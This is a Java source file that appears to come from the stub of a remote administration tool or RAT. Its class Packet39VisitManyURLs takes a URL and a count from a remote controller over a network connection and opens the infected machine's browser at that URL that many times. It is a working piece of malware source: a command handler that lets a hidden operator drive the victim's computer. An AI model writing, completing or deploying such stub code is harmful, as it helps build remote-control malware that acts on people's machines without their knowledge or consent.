package com.redpois0n.stub.packets.incoming;

import java.net.URI;

import com.redpois0n.Connection;


public class Packet39VisitManyURLs extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();
		int times = Connection.readInt();
		try {
			for (int i = 0; i < times; i++) {
				java.awt.Desktop.getDesktop().browse(new URI(url));
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
